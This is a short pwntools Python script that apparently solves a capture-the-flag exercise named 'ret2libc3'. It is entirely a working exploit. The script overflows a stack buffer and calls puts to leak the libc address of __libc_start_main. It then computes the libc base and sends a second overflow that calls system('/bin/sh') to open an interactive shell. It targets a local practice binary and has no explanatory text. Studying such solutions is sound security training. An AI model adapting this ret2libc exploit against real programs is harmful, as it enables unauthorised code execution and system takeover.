from pwn import *


sh = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')

puts_plt = elf.plt['puts']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

sh.sendlineafter('Can you find it !?', flat([112 * 'a', puts_plt, main, libc_start_main_got]))
libc_start_main_add = u32(sh.recv()[0:4])
libcbase = libc_start_main_add - libc.symbols['__libc_start_main']
system_addr = libcbase + libc.symbols['system']
binsh_addr = libcbase + next(libc.search(b'/bin/sh'))
sh.sendline(flat([104 * 'a', system_addr, 'aaaa', binsh_addr]))

sh.interactive()
